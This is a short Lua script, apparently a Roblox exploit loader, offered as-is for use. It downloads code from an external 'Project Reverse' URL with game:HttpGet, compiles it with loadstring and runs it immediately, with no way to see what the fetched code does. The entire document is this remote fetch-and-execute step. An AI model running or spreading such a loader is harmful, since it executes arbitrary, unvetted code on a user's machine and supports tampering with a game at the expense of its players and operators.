local rawCode = game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6Ijg1YWY3NDg3LTM3NjUtNDYzMS1hZjFhLThkNjJiNDA4NDJhZSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJhbWVhbmFseXNlciJ9fQ")
local runScript = loadstring(rawCode)
if runScript then
    runScript()
else
    warn("Failed to load script from Project Reverse")
end
